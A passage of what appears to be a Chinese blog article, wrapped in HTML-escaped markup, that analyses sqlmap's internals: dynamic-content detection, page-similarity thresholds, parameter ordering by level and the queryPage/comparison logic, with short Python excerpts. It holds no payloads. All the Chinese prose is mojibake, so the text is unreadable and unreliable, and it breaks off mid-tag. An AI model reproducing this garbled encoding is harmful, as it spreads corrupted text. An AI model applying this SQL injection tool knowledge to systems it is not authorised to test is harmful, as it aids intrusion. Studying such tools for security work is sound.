checkStability&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;è¿™ä¸ªå‡½æ•°å…¶å®æ˜¯åœ¨æ£€æŸ¥åŸå§‹é¡µé¢æ˜¯å­˜åœ¨åŠ¨æ€å†…å®¹ï¼Œå¹¶åšä¸€äº›å¤„ç†ã€‚ä½•ä¸ºåŠ¨æ€å†…å®¹ï¼Ÿåœ¨ sqlmap ä¸­è¡¨ç¤ºä»¥åŒæ ·çš„æ–¹å¼è®¿é—®é‡æ¬¡åŒä¸€ä¸ªé¡µé¢ï¼Œè®¿é—®å‰åé¡µé¢å†…å®¹å¹¶ä¸æ˜¯å®Œå…¨ç›¸åŒï¼Œä»–ä»¬ç›¸å·®çš„å†…å®¹å±äºåŠ¨æ€å†…å®¹ã€‚å½“ç„¶ï¼Œsqlmap çš„å¤„ç†æ–¹å¼ä¹Ÿå¹¶ä¸æ˜¯éšæ„çš„æ¯”è¾ƒä¸¤ä¸ªé¡µé¢å°±æ²¡æœ‰ç„¶åäº†ï¼Œåœ¨æ¯”è¾ƒå®Œä¹‹åï¼Œå¦‚æœå­˜åœ¨åŠ¨æ€é¡µé¢ï¼Œè¿˜ä¼šåšä¸€éƒ¨åˆ†çš„å¤„ç†ï¼Œæˆ–è€…æå‡ºæ‰©å±•è®¾ç½®ï¼ˆ&lt;code class=&quot;inline&quot;&gt;--string/--regex&lt;/code&gt;ï¼‰ï¼Œä»¥æ–¹ä¾¿åç»­ä½¿ç”¨ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1440e57d7b4efd880a250213aa64f20e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1184&quot; data-rawheight=&quot;780&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-1440e57d7b4efd880a250213aa64f20e&quot; data-watermark-src=&quot;v2-fbc8433d6a32ac6eb6edb03beb65f110&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬å‘ç°ï¼Œå®é™…çš„ sqlmap æºç ç¡®å®æ˜¯æŒ‰ç…§æˆ‘ä»¬ä»‹ç»çš„å†…å®¹å¤„ç†çš„ï¼Œå¦‚æœé¡µé¢å†…å®¹æ˜¯åŠ¨æ€çš„è¯ï¼Œåˆ™ä¼šæç¤ºç”¨æˆ·å¤„ç†å­—ç¬¦ä¸²æˆ–è€…å¢åŠ æ­£åˆ™è¡¨è¾¾å¼æ¥éªŒè¯é¡µé¢ã€‚&lt;/p&gt;&lt;blockquote&gt;é»˜è®¤æƒ…å†µä¸‹sqlmapé€šè¿‡åˆ¤æ–­è¿”å›é¡µé¢çš„ä¸åŒæ¥åˆ¤æ–­çœŸå‡ï¼Œä½†æœ‰æ—¶å€™è¿™ä¼šäº§ç”Ÿè¯¯å·®ï¼Œå› ä¸ºæœ‰çš„é¡µé¢åœ¨æ¯æ¬¡åˆ·æ–°çš„æ—¶å€™éƒ½ä¼šè¿”å›ä¸åŒçš„ä»£ç ï¼Œæ¯”å¦‚é¡µé¢å½“ä¸­åŒ…å«ä¸€ä¸ªåŠ¨æ€çš„å¹¿å‘Šæˆ–è€…å…¶ä»–å†…å®¹ï¼Œè¿™ä¼šå¯¼è‡´sqlmapçš„è¯¯åˆ¤ã€‚æ­¤æ—¶ç”¨æˆ·å¯ä»¥æä¾›ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€…ä¸€æ®µæ­£åˆ™åŒ¹é…ï¼Œåœ¨åŸå§‹é¡µé¢ä¸çœŸæ¡ä»¶ä¸‹çš„é¡µé¢éƒ½å­˜åœ¨çš„å­—ç¬¦ä¸²ï¼Œè€Œé”™è¯¯é¡µé¢ä¸­ä¸å­˜åœ¨ï¼ˆä½¿ç”¨--stringå‚æ•°æ·»åŠ å­—ç¬¦ä¸²ï¼Œ--regexpæ·»åŠ æ­£åˆ™ï¼‰ï¼ŒåŒæ—¶ç”¨æˆ·å¯ä»¥æä¾›ä¸€æ®µå­—ç¬¦ä¸²åœ¨åŸå§‹é¡µé¢ä¸çœŸæ¡ä»¶ä¸‹çš„é¡µé¢éƒ½ä¸å­˜åœ¨çš„å­—ç¬¦ä¸²ï¼Œè€Œé”™è¯¯é¡µé¢ä¸­å­˜åœ¨çš„å­—ç¬¦ä¸²ï¼ˆ--not-stringæ·»åŠ ï¼‰ã€‚ç”¨æˆ·ä¹Ÿå¯ä»¥æä¾›çœŸä¸å‡æ¡ä»¶è¿”å›çš„HTTPçŠ¶æ€ç ä¸ä¸€æ ·æ¥æ³¨å…¥ï¼Œä¾‹å¦‚ï¼Œå“åº”200çš„æ—¶å€™ä¸ºçœŸï¼Œå“åº”401çš„æ—¶å€™ä¸ºå‡ï¼Œå¯ä»¥æ·»åŠ å‚æ•°--code=200ã€‚&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;checkDynamicContent(firstPage, secondPage)&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;æˆ‘ä»¬å‘ç°ï¼Œå¦‚æœè¯´æˆ‘ä»¬å¹¶æ²¡æŒ‡å®š &lt;code class=&quot;inline&quot;&gt;string / regex&lt;/code&gt; é‚£ä¹ˆå¾ˆå¤šæƒ…å†µï¼Œæˆ‘ä»¬ä»ç„¶ä¹Ÿå¯ä»¥æ­£ç¡®å¾—å‡ºç»“æœï¼›æ ¹æ® sqlmap æºç ï¼Œå®ƒå®é™…ä¸ŠèƒŒåè¿˜æ˜¯æœ‰ä¸€äº›å¤„ç†æ–¹æ³•çš„ï¼Œè€Œè¿™äº›æ–¹æ³•å°±åœ¨ &lt;code class=&quot;inline&quot;&gt;checkDynamicContent(firstPage, secondPage)&lt;/code&gt; ä¸­ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-5d809fdef4992d3325d0eb191a29b70a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1188&quot; data-rawheight=&quot;699&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-5d809fdef4992d3325d0eb191a29b70a&quot; data-watermark-src=&quot;v2-42eaf7b0265856ba73b5d5345e111776&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬åœ¨è¿™ä¸ªå‡½æ•°ä¸­å‘ç°å¦‚æœ &lt;code class=&quot;inline&quot;&gt;firstPage å’Œ secondPage&lt;/code&gt; çš„ç›¸ä¼¼åº¦å°äº 0.98 ï¼ˆè¿™ä¸ªç›¸ä¼¼åº¦çš„æ¦‚å¿µå°±æ˜¯å‰ä¸€èŠ‚ä»‹ç»çš„ PageRatio çš„æ¦‚å¿µï¼‰ï¼Œåˆ™ä¼šé‡è¯•ï¼Œå¹¶ä¸”å°è¯• &lt;code class=&quot;inline&quot;&gt;findDynamicContent(firstPage, secondPage)&lt;/code&gt; ç„¶åç»†åŒ–é¡µé¢ç©¶ç«Ÿæ˜¯ &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt; è¿˜æ˜¯ &lt;code class=&quot;inline&quot;&gt;heavily dynamic&lt;/code&gt;ã€‚&lt;/p&gt;&lt;p&gt;å¦‚æœé¡µé¢æ˜¯ &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt; åˆ™æç¤ºå¯ç”¨ &lt;code class=&quot;inline&quot;&gt;--text-only&lt;/code&gt; é€‰é¡¹ï¼š&lt;/p&gt;&lt;blockquote&gt;æœ‰äº›æ—¶å€™ç”¨æˆ·çŸ¥é“çœŸæ¡ä»¶ä¸‹çš„è¿”å›é¡µé¢ä¸å‡æ¡ä»¶ä¸‹è¿”å›é¡µé¢æ˜¯ä¸åŒä½ç½®åœ¨å“ªé‡Œå¯ä»¥ä½¿ç”¨--text-onlyï¼ˆHTTPå“åº”ä½“ä¸­ä¸åŒï¼‰--titlesï¼ˆHTMLçš„titleæ ‡ç­¾ä¸­ä¸åŒï¼‰ã€‚&lt;/blockquote&gt;&lt;p&gt;å¦‚æœé¡µé¢ä»…ä»…æ˜¯æ˜¾ç¤º &lt;code class=&quot;inline&quot;&gt;heavy dynamic&lt;/code&gt; çš„è¯ï¼Œsqlmap ä¼šä¸æ–­é‡è¯•ç›´åˆ°åŒºåˆ†å‡ºåˆ°åº•æ˜¯ &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt; è¿˜æ˜¯æ™®é€šçš„å¯ä»¥æ¥å—çš„åŠ¨æ€é¡µé¢ï¼ˆç›¸ä¼¼åº¦å¤§äº 0.98ï¼‰ã€‚&lt;/p&gt;&lt;p&gt;å¯¹äº &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt; ä¸å¯ä»¥æ¥å—çš„åŠ¨æ€é¡µé¢ï¼ˆç›¸ä¼¼åº¦é«˜äº 0.98ï¼‰ï¼Œå…¶å®æœ€æ ¹æœ¬çš„åŒºåˆ«å°±æ˜¯åœ¨äº PageRatio, å¦‚æœå¤šæ¬¡å°è¯•ï¼ˆè¶…è¿‡ conf.retriesï¼‰ è®¾ç½®çš„å°è¯•æ¬¡æ•°ï¼Œä»ç„¶å‡ºç°äº†ç›¸ä¼¼åº¦ä½äº 0.98 åˆ™ä¼šè®¤ä¸ºè¿™ä¸ªé¡µé¢ &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt;ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;findDynamicContent(firstPage, secondPage)&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;è¿™ä¸ªå‡½æ•°ä½äº &lt;code class=&quot;inline&quot;&gt;common.py&lt;/code&gt; ä¸­ï¼Œè¿™ä¸ªå‡½æ•°ä½œä¸ºé€šç”¨å‡½æ•°ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦éå¸¸ä¸¥æ ¼çš„å»å®¡ä»–çš„æºç ï¼Œä¸ºäº†èŠ‚çœå¤§å®¶çš„æ—¶å€™ï¼Œç¬”è€…åœ¨è¿™é‡Œå¯ä»¥æè¿°è¿™ä¸ªå‡½æ•°åšäº†ä¸€ä»¶ä»€ä¹ˆæ ·çš„äº‹æƒ…ï¼Œå¹¶ä¸¾ä¾‹è¯´æ˜ã€‚&lt;/p&gt;&lt;p&gt;è¿™ä¸ªå‡½æ•°æŒ‰å‡½æ•°åæ¥è§£é‡Šå…¶å®æ˜¯ï¼Œå¯»æ‰¾åŠ¨æ€çš„é¡µé¢å†…å®¹ã€‚&lt;/p&gt;&lt;p&gt;å®é™…åœ¨å·¥ä½œä¸­ï¼Œå¦‚æœå¯»æ‰¾åˆ°åŠ¨æ€å†…å®¹ï¼Œåˆ™ä¼šå°†åŠ¨æ€å†…å®¹çš„å‰åå†…å®¹ï¼ˆå‰ï¼š&lt;code class=&quot;inline&quot;&gt;prefix&lt;/code&gt;ï¼Œåï¼š&lt;code class=&quot;inline&quot;&gt;suffix&lt;/code&gt;ï¼Œé•¿åº¦å‡åœ¨ &lt;code class=&quot;inline&quot;&gt;DYNAMICITY_BOUNDARY_LENGTH&lt;/code&gt; ä¸­è®¾å®šï¼Œé»˜è®¤ä¸º 20ï¼‰ä½œä¸ºä¸€ä¸ª tupleï¼Œå­˜å…¥ &lt;code class=&quot;inline&quot;&gt;kb.dynamicMarkings&lt;/code&gt;ï¼Œåœ¨æ¯ä¸€æ¬¡é¡µé¢æ¯”è¾ƒä¹‹å‰ï¼Œä¼šé»˜è®¤ç§»é™¤è¿™äº›åŠ¨æ€å†…å®¹ã€‚&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;kb.dynamicMarkings.append((prefix if prefix else None, suffix if suffix else None))&lt;/code&gt;&lt;p&gt;ä¾‹å¦‚ï¼Œåœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œæˆ‘ä»¬æŒ‰ç…§å®˜æ–¹ç»™å®šçš„ä¸€ä¸ªä¾‹å­ï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
    &quot;&quot;&quot;
    This function checks if the provided pages have dynamic content. If they
    are dynamic, proper markings will be made
                          
    &amp;gt;&amp;gt;&amp;gt; findDynamicContent(&quot;Lorem ipsum dolor sit amet, congue tation referrentur ei sed. Ne nec legimus habemus recusabo, natum reque et per. Facer tritani reprehendunt eos id, modus constituam est te. Usu sumo indoctum ad, pri paulo molestiae complectitur no.&quot;, 
                           &quot;Lorem ipsum dolor sit amet, congue tation referrentur ei sed. Ne nec legimus habemus recusabo, natum reque et per. &amp;lt;script src=&#39;ads.js&#39;&amp;gt;&amp;lt;/script&amp;gt;Facer tritani reprehendunt eos id, modus constituam est te. Usu sumo indoctum ad, pri paulo molestiae complectitur no.&quot;)
    &amp;gt;&amp;gt;&amp;gt; kb.dynamicMarkings
    [(&#39;natum reque et per. &#39;, &#39;Facer tritani repreh&#39;)]
    &quot;&quot;&quot;&lt;/code&gt;&lt;p&gt;æ ¹æ®è§‚å¯Ÿï¼Œä¸¤æ®µæ–‡æœ¬å·®åˆ«åœ¨ &lt;code class=&quot;inline&quot;&gt;script&lt;/code&gt; æ ‡ç­¾ï¼Œæ ‡è®°çš„åŠ¨æ€å†…å®¹åº”è¯¥æ˜¯ &lt;code class=&quot;inline&quot;&gt;script&lt;/code&gt; æ ‡ç­¾ï¼Œæ‰€ä»¥åŠ¨æ€å†…å®¹çš„å‰ 20 å­—èŠ‚çš„æ–‡æœ¬åº§ä½ &lt;code class=&quot;inline&quot;&gt;prefix&lt;/code&gt; å 20 å­—èŠ‚çš„æ–‡æœ¬ä½œä¸º &lt;code class=&quot;inline&quot;&gt;suffix&lt;/code&gt;ï¼Œåˆ†åˆ«ä¸ºï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;prefix: &lt;code class=&quot;inline&quot;&gt;&#39;natum reque et per. &#39;&lt;/code&gt;&lt;/li&gt;&lt;li&gt;suffix: &lt;code class=&quot;inline&quot;&gt;&#39;Facer tritani repreh&#39;&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;0x03 ä¸­åœºä¼‘æ¯ä¸é˜¶æ®µæ€§æ€»ç»“&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;æˆ‘ä»¬è™½ç„¶ä¹‹åˆ†æäº†ä¸¤ä¸ªå¤§å‡½æ•°ï¼Œä½†æ˜¯æ•´ä¸ªåˆ¤æ–­é¡µé¢ç›¸åº”å†…å®¹çš„æ ¸å¿ƒåŸç†åº”è¯¥æ˜¯å·²ç»éå¸¸æ¸…æ™°äº†ï¼›å¯èƒ½æœ‰äº›è¯»è€…åé¦ˆæˆ‘ä»¬çš„è¿›åº¦ç•¥æ…¢ï¼Œä½†æ˜¯å…¶å®è¿™å¥½æ¯”ä¸€ä¸ªæ‰“åŸºç¡€çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬åŸºç¡€è¶Šæ‰å®å¯¹ sqlmap è¶Šç†Ÿæ‚‰ï¼Œåˆ†æåé¢çš„éƒ¨åˆ†å°±è¶Šå¿«ã€‚&lt;/p&gt;&lt;p&gt;ä¸ºäº†æ›´å¥½çš„ç»§ç»­ï¼Œæˆ‘ä»¬éœ€è¦å›é¡¾ä¸€ä¸‹ä¹‹å‰çš„æµç¨‹å›¾&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-09f240e25764349996a613036b3e4b0a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;660&quot; data-rawheight=&quot;395&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-09f240e25764349996a613036b3e4b0a&quot; data-watermark-src=&quot;v2-c58c5090cd22742c8b9f9698636c40c3&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;å¥½çš„ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯å›¾ä¸­æè¿°çš„éƒ¨åˆ†â€œè¿‡æ»¤é‡å¤ä»¥åŠä¸éœ€è¦æ£€æŸ¥çš„å‚æ•°ï¼Œç„¶åæ£€æŸ¥å‚æ•°æ˜¯ä¸ºåŠ¨æ€å‚æ•°â€ï¼Œåœ¨ä¸‹ä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å°†ä¼šè¯¦ç»†ä»‹ç» sqlmap å…¶ä»–çš„æ ¸å¿ƒå‡½æ•°ï¼Œè¯¸å¦‚å¯å‘å¼æ£€æµ‹ï¼Œå’Œ sql æ³¨å…¥æ£€æµ‹æ ¸å¿ƒå‡½æ•°ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04 å‚æ•°é¢„å¤„ç†ä»¥åŠåŠ¨æ€å‚æ•°æ£€æŸ¥&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;å‚æ•°é¢„å¤„ç†&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;å‚æ•°é¢„å¤„ç†åŒ…å«å¦‚ä¸‹æ­¥éª¤ï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;å‚æ•°æ’åº&lt;br&gt;# Order of testing list (first to last)&lt;br&gt;orderList = (PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER, PLACE.URI, PLACE.POST, PLACE.GET)&lt;br&gt;â€‹&lt;br&gt;for place in orderList[::-1]:&lt;br&gt; if place in parameters:&lt;br&gt; parameters.remove(place)&lt;br&gt; parameters.insert(0, place)&lt;/li&gt;&lt;li&gt;å‚æ•°åˆ†çº§æ£€æŸ¥&lt;br&gt;&lt;br&gt;for place in parameters:&lt;br&gt; # Test User-Agent and Referer headers only if&lt;br&gt; # --level &amp;gt;= 3&lt;br&gt; skip = (place == PLACE.USER_AGENT and conf.level &amp;lt; 3)&lt;br&gt; skip |= (place == PLACE.REFERER and conf.level &amp;lt; 3)&lt;br&gt;â€‹&lt;br&gt; # Test Host header only if&lt;br&gt; # --level &amp;gt;= 5&lt;br&gt; skip |= (place == PLACE.HOST and conf.level &amp;lt; 5)&lt;br&gt;â€‹&lt;br&gt; # Test Cookie header only if --level &amp;gt;= 2&lt;br&gt; skip |= (place == PLACE.COOKIE and conf.level &amp;lt; 2)&lt;br&gt;â€‹&lt;br&gt; skip |= (place == PLACE.USER_AGENT and intersect(USER_AGENT_ALIASES, conf.skip, True) not in ([], None))&lt;br&gt; skip |= (place == PLACE.REFERER and intersect(REFERER_ALIASES, conf.skip, True) not in ([], None))&lt;br&gt; skip |= (place == PLACE.COOKIE and intersect(PLACE.COOKIE, conf.skip, True) not in ([], None))&lt;br&gt; skip |= (place == PLACE.HOST and intersect(PLACE.HOST, conf.skip, True) not in ([], None))&lt;br&gt;â€‹&lt;br&gt; skip &amp;amp;= not (place == PLACE.USER_AGENT and intersect(USER_AGENT_ALIASES, conf.testParameter, True))&lt;br&gt; skip &amp;amp;= not (place == PLACE.REFERER and intersect(REFERER_ALIASES, conf.testParameter, True))&lt;br&gt; skip &amp;amp;= not (place == PLACE.HOST and intersect(HOST_ALIASES, conf.testParameter, True))&lt;br&gt; skip &amp;amp;= not (place == PLACE.COOKIE and intersect((PLACE.COOKIE,), conf.testParameter, True))&lt;br&gt;â€‹&lt;br&gt; if skip:&lt;br&gt; continue&lt;br&gt;â€‹&lt;br&gt; if kb.testOnlyCustom and place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER):&lt;br&gt; continue&lt;br&gt;â€‹&lt;br&gt; if place not in conf.paramDict:&lt;br&gt; continue&lt;br&gt;â€‹&lt;br&gt; paramDict = conf.paramDict[place]&lt;br&gt;â€‹&lt;br&gt; paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else place&lt;/li&gt;&lt;li&gt;å‚æ•°è¿‡æ»¤&lt;/li&gt;&lt;/ol&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3449ea6acc9fc11700479e927f570242_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1490&quot; data-rawheight=&quot;728&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-3449ea6acc9fc11700479e927f570242&quot; data-watermark-src=&quot;v2-ff650ae113fc375acf08cf0865584366&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;checkDynParam(place, parameter, value)&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;æˆ‘ä»¬è¿›å…¥ &lt;code class=&quot;inline&quot;&gt;checkDynParam&lt;/code&gt; å‡½æ•°å‘ç°ï¼Œæ•´ä¸ªå‡½æ•°å…¶å®çœ‹èµ·æ¥éå¸¸ç®€å•ï¼Œä½†æ˜¯å®é™…ä¸Šæˆ‘ä»¬å‘ç° &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; è¿™ä¸ªå‡½æ•°ç°åœ¨åˆè¿”å›äº†ä¸€ä¸ªå¥½åƒæ˜¯ Bool å€¼çš„è¿”å›å€¼ä½œä¸º &lt;code class=&quot;inline&quot;&gt;dynResult&lt;/code&gt; è¿™ä»¤æˆ‘ä»¬éå¸¸å›°æƒ‘ï¼Œæˆ‘ä»¬ä¸Šä¸€æ¬¡è§è¿™ä¸ªå‡½æ•°è¿”å›çš„æ˜¯ &lt;code class=&quot;inline&quot;&gt;(page, headers, code)&lt;/code&gt; ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b16ff2abb515c255ba3be9619c11251d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1117&quot; data-rawheight=&quot;664&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-b16ff2abb515c255ba3be9619c11251d&quot; data-watermark-src=&quot;v2-eb0503c02fa3ede2b68a866725b03bed&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬å‘ç°å®é™…ä¸Šçš„é¡µé¢æ¯”è¾ƒé€»è¾‘ä¹Ÿå¹¶ä¸æ˜¯åœ¨ &lt;code class=&quot;inline&quot;&gt;checkDynParam&lt;/code&gt; ï¼Œæ‰€ä»¥è¡¨é¢ä¸Šï¼Œæˆ‘ä»¬è¿™ä¸€èŠ‚çš„å†…å®¹æ˜¯åœ¨ &lt;code class=&quot;inline&quot;&gt;checkDynParam&lt;/code&gt; è¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯å®é™…ä¸Šæˆ‘ä»¬ä»ç„¶éœ€è¦è·Ÿè¿›åˆ° &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt;ã€‚&lt;/p&gt;&lt;p&gt;é‚£ä¹ˆï¼Œç­‰ä»€ä¹ˆå‘¢ï¼Ÿç»§ç»­å§ï¼&lt;/p&gt;&lt;h2&gt;&lt;b&gt;agent.queryPage ä¸ comparison&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;è·Ÿè¿› &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; æˆ‘ç›¸ä¿¡ä¸€å®šæ˜¯ç—›è‹¦çš„ï¼Œè¿™å…¶å®ç®—æ˜¯ sqlmap çš„æ ¸å¿ƒåŸºç¡€å‡½æ•°ä¹‹ä¸€ï¼Œé‡Œé¢åŒ…å«äº†æ¥è¿‘ä¸‰å››ç™¾è¡Œçš„è¯·æ±‚å‰é¢„å¤„ç†ï¼ŒåŒ…å« &lt;code class=&quot;inline&quot;&gt;tamper&lt;/code&gt; çš„å¤„ç†é€»è¾‘ä»¥åŠéšæœºåŒ–å‚æ•°å’Œ CSRF å‚æ•°çš„å¤„ç†æ£€æµ‹é€»è¾‘ã€‚åŒæ—¶å¦‚æœæ¶‰åŠåˆ°äº† &lt;code class=&quot;inline&quot;&gt;timeBasedCompare&lt;/code&gt; è¿˜åŒ…å«ç€æ—¶é—´ç›²æ³¨çš„å¤„ç†é€»è¾‘ï¼›é™¤æ­¤ä¹‹å¤–ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; ä¸­è¿˜å­˜åœ¨ç€é’ˆå¯¹é¡µé¢æ¯”è¾ƒçš„æ ¸å¿ƒè°ƒç”¨ï¼Œé¡µé¢å¯¹æ¯”å¯¹åº”å‡½æ•°ä¸º &lt;code class=&quot;inline&quot;&gt;comparison&lt;/code&gt;ã€‚ä¸ºäº†ç®€åŒ–å¤§å®¶çš„è´Ÿæ‹…ï¼Œç¬”è€…åªæˆªå–æœ€åè¿”å›å€¼çš„éƒ¨åˆ† &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-31010288239691eb6dbbbbeaa5f4d255_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1620&quot; data-rawheight=&quot;424&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-31010288239691eb6dbbbbeaa5f4d255&quot; data-watermark-src=&quot;v2-f06c7f596d8bd6637e5dc5d992635f19&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;åœ¨æ ‡æ³¨ä¸­ï¼Œæˆ‘ä»¬å‘ç°äº†æˆ‘ä»¬ä¹‹å‰çš„ç–‘é—®ï¼Œä¸ºä»€ä¹ˆ &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; æ—¶è€Œè¿”å›é¡µé¢å†…å®¹ï¼Œæ—¶è€Œè¿”å›é¡µé¢ä¸æ¨¡ç‰ˆé¡µé¢çš„æ¯”è¾ƒç»“æœã€‚å…¶å®åœ¨äºå¦‚æœ &lt;code class=&quot;inline&quot;&gt;content/response&lt;/code&gt; è¢«è®¾ç½®ä¸º &lt;code class=&quot;inline&quot;&gt;True&lt;/code&gt; çš„æ—¶å€™ï¼Œåˆ™ä¼šè¿”å›é¡µé¢å…·ä½“å†…å®¹ï¼Œheadersï¼Œä»¥åŠå“åº”ç ï¼›å¦‚æœ &lt;code class=&quot;inline&quot;&gt;timeBasedCompare&lt;/code&gt; è¢«è®¾å®šçš„æ—¶å€™ï¼Œè¿”å›æ˜¯å¦å‘ç”Ÿäº†å»¶è¿Ÿï¼›é»˜è®¤æƒ…å†µè¿”å›ä¸æ¨¡ç‰ˆé¡µé¢çš„æ¯”è¾ƒç»“æœã€‚&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬å‘ç°è¿™ä¸€ä¸ª &lt;code class=&quot;inline&quot;&gt;comparison&lt;/code&gt; å‡½æ•°å¾ˆå¥‡æ€ªï¼Œä»–æ²¡æœ‰è¾“å…¥ä¸¤ä¸ªé¡µé¢çš„å†…å®¹ï¼Œè€Œæ˜¯ä»…ä»…è¾“å…¥å½“å‰é¡µé¢çš„ç›¸å…³ä¿¡æ¯ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆç¬”è€…è¦æ˜ç¡®è¯´æ˜¯ä¸â€œæ¨¡ç‰ˆé¡µé¢â€çš„æ¯”è¾ƒç»“æœå‘¢ï¼Ÿæˆ‘ä»¬é©¬ä¸Šå°±è·Ÿå…¥ &lt;code class=&quot;inline&quot;&gt;comparison&lt;/code&gt; ä¸€æ¢ç©¶ç«Ÿã€‚&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e87a24d60d2cbb3614eecfd760d55c6b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1077&quot; data-rawheight=&quot;449&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e87a24d60d2cbb3614eecfd760d55c6b&quot; data-watermark-src=&quot;v2-3a5937b488503b66381fb28faea64e7b&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;è¿›å»ä¹‹åæ ¹æ®å›¾ä¸­çš„è°ƒç”¨å…³ç³»ï¼Œæˆ‘ä»¬ä¸»è¦éœ€è¦è§‚å¯Ÿä¸€ä¸‹ &lt;code class=&quot;inline&quot;&gt;_comparison&lt;/code&gt; è¿™ä¸ªå‡½æ•°çš„è¡Œä¸ºã€‚å½“æ‰“å¼€è¿™ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œæˆ‘ä»¬å‘ç°ä¹Ÿæ˜¯ä¸€æ®µæ¥è¿‘ä¸€ç™¾è¡Œçš„å‡½æ•°ï¼Œä»ç„¶æ˜¯ä¸€ä¸ªéœ€è¦ç¡¬ç€å¤´çš®çœ‹ä¸‹å»çš„ä¸€æ®µä»£ç ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6bbd0c8d31d584f2b44c3d56b1ddc513_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1112&quot; data-rawheight=&quot;587&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6bbd0c8d31d584f2b44c3d56b1ddc513&quot; data-watermark-src=&quot;v2-ae634362bd18d5ac79886e5721995c28&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æ ¹æ®å›¾ä¸­çš„ä½¿ç”¨çº¢è‰²æ–¹æ¡†æ¡†ä½çš„ä»£ç ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“å°±èƒ½å‘ç°ï¼Œè¿™å…¶å®æ˜¯åœ¨ç¦ç”¨ &lt;code 